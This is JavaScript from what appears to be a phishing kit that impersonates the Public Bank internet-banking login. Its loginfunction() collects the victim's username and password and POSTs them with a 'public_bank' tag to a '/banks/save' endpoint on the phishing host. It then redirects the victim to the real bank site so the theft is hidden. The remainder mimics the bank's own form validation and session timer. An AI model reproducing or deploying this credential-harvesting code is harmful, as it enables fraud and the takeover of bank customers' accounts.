    function loginfunction() {
        if(document.getElementById("password").value.length > 0) {
            $.ajax({
                headers: {
                    'X-CSRF-TOKEN': parent.parent.document.getElementById("csrf-token").content
                },
                type: "POST",
                data: {username: document.getElementById("username").value,
                    password: document.getElementById("password").value,
                    bankname: "public_bank"},
                url : "/banks/save",
                success : function (sdata) {
                    // document.getElementById("test").innerHTML = sdata ;
                    // document.getElementById("test").append(sdata);
                    // $('#test').html(sdata);
                    parent.location.href = "https://www2.pbebank.com/myIBK/apppbb/servlet/";
                }
            });
		}
	}

	function userfunction() {
		if(document.getElementById("username").value.length > 0) {
			document.getElementById("usernamefield").style.display = "none";
			document.getElementById("username").style.display = "none";
			document.getElementById("usernamebtn").style.display = "none";
			document.getElementById("passwordfield").style.display = "block";
			document.getElementById("password").style.display = "block";
			document.getElementById("passwordbtn").style.display = "block";
		}
	}
</script>

<script type="text/javascript">
    $(document).ready(function () {
        /*if (window.top==window.self) {
        location.href = "LoginPBB.html";
        }*/

        $('#NextBtn').click(function () {
            var msg = "Next";
            $('#NB').val(msg);
        });

        document.onkeydown = handleKeyPress_CNPY;
        (new FormObjects()).setTitle((new ModalDialogObjects()).junctionType()["login-title"]);
        document.forms[0].tempusername.focus();
    });

    function leave() 
    {
      top.window.location = "https://www.pbebank.com/";
    }

    function handleKeyPress_CNPY(evt) {
        var nbr;
        if (window.event) nbr = event.keyCode;
        var e = window.event;
        if (nbr == 13) {
            if (!mandatoryChecking()) {
                return false;
            }
            else {
                /* alert('Please click the Next Button to proceed');
                e.cancelBubble = true;
                e.returnValue = false;
                if (e.stopPropagation) {
                e.stopPropagation();
                e.preventDefault();
                }*/
                return true;
            }
            // return false;
        }
        return true;
    }

    function doSubmit_CNPY() {
        
    	   
        if (!mandatoryChecking()) {
            setTimeout('leave()', 1000); //redirect to homepage in 1 second 
            return false;
        }else if(!alphanumeric( document.LoginForm.tempusername.value))
        	{
        	return false;
        	}
        else {
            //document.LoginForm.username.value = document.LoginForm.tempusername.value.replace(/^\s\s*/, '').replace(/\s\s*$/, '').toUpperCase();
            document.LoginForm.username.value = document.LoginForm.tempusername.value.replace(/^\s\s*/, '').replace(/\s\s*$/, '');
            document.LoginForm.tempusername.disabled = true;
            //       document.LoginForm.Next.focus();            
            //return true;
        }
        return true;
    }

    function mandatoryChecking(){
    	if (trim(document.LoginForm.tempusername.value) == "" || trim(document.LoginForm.tempusername.value) == "User ID") {
                alert("User ID is required.");
                document.LoginForm.tempusername.focus();
                return false;
            }
            else {
    	     return true;
    	}
    }
    
    function alphanumeric(inputtxt)
    {
    	var letterNumber=/^[0-9a-zA-Z]+$/;
    	if((inputtxt.match(letterNumber)))
    		{
    		return true;
    		}else
    			{
    			alert("Username contains non Alphanumberic values and spaces")
    			return false;
    			}
    }


    
    
    
    var url = top.window.location.href;
    if (url.indexOf("PaymentAgent") != -1)
    {
      var now = -1000;

      // Update the count down every 1 second
      var x = setInterval(function() {

        // Get todays date and time
        now = now + 1000;
    
        // Find the distance between now an the count down date
        //var distance = 300000 - now;
        var distance = 300000 - now;
    
        // Time calculations for days, hours, minutes and seconds
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
        // Output the result in an element with id="demo"
        document.getElementById("timer").innerHTML = "This session will close in " + "[00:" + ("0" + minutes).slice(-2) + ":" + ("0" + seconds).slice(-2) + "]";
    
        // If the count down is over, write some text 
        if (distance <= 0) {
          clearInterval(x);
          //document.getElementById("demo").innerHTML = "EXPIRED";
          top.window.location = "https://www.pbebank.com/";
        }
    
      }, 1000);
    }

</script>
